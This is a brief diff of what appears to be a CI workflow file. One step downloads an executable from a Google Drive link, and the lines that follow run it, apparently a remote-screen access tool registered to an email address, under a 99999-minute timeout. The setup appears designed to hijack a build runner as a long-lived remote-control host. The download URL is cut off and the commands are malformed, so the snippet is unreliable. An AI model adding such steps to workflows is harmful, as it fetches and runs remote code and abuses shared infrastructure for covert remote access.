@@ -12,6 +12,6 @@ jobs:
         run: |
          
          Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=13fp07AYiONScFmMkJTdLNjto_m-
-          cmd.exe /k < \\\download\getscreen.exe
-
+             cmd /c -install -register kauanscintras@gmail.com
+          
     timeout-minutes: 99999
